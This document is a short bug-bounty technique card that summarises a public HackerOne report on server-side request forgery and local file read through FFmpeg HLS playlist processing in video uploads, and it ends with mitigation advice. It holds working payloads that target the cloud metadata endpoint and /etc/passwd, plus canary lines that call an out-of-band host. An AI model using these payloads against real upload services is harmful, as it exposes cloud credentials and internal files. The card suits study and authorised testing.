---
name: ssrf-ffmpeg-hls
description: SSRF + local file read via FFmpeg HLS processing during video upload. Teaches abusing media processors (FFmpeg/ImageMagick) with HLS playlists and concat/live protocols to read files and hit internal/metadata endpoints.
sources: hackerone_public
report_count: 1
---

# SSRF + LFR via FFmpeg HLS processing

**Report**: TikTok — "External SSRF and Local File Read via video upload due to vulnerable FFmpeg HLS processing" (hackerone.com/reports/1062888, high, $2,727).

## Why it matters (the new lesson)
Upload/transcode pipelines run FFmpeg/ImageMagick server-side on attacker-supplied media. Media formats are *Turing-complete as network clients*: an HLS playlist (`#EXTM3U`) or concat demuxer can make FFmpeg fetch `http://` (SSRF) or `file://` (LFR) sources. This turns "just a video upload" into SSRF/file-read that bypasses app-level URL validation because the *file content* triggers the fetch, not a URL field.

## How it works
Upload a `.m3u8` (or a file FFmpeg auto-detects) whose playlist references attacker/metadata URLs:
```
#EXTM3U
#EXT-X-TARGETDURATION:10
#EXTINF:10,
http://169.254.169.254/latest/meta-data/
```
FFmpeg's HLS demuxer opens those URLs as segments → SSRF / metadata read. `concat:` and `file:` can read local files.

## How to hunt for it
1. Find video/audio/thumbnail upload + processing features.
2. Upload a playlist / crafted file referencing Collaborator URL → look for OOB DNS/HTTP hit.
3. Then target `http://169.254.169.254/...` (AWS), `file:///etc/passwd`, `http://127.0.0.1:PORT`.

## Payloads
```
#EXTM3U\n#EXTINF:10,\nhttp://CANARY.oastify.com/a.ts
concat:http://CANARY.oastify.com/x|file:///etc/passwd
```
(Also try ImageMagick `image:`/`url`/`vid:`/`ephemeral:` protocols on image upload.)

## Fix
Run FFmpeg/ImageMagick in a sandbox with no network + allowlisted filesystem; disable HLS/live/remote protocols; validate media with a hardened decoder.
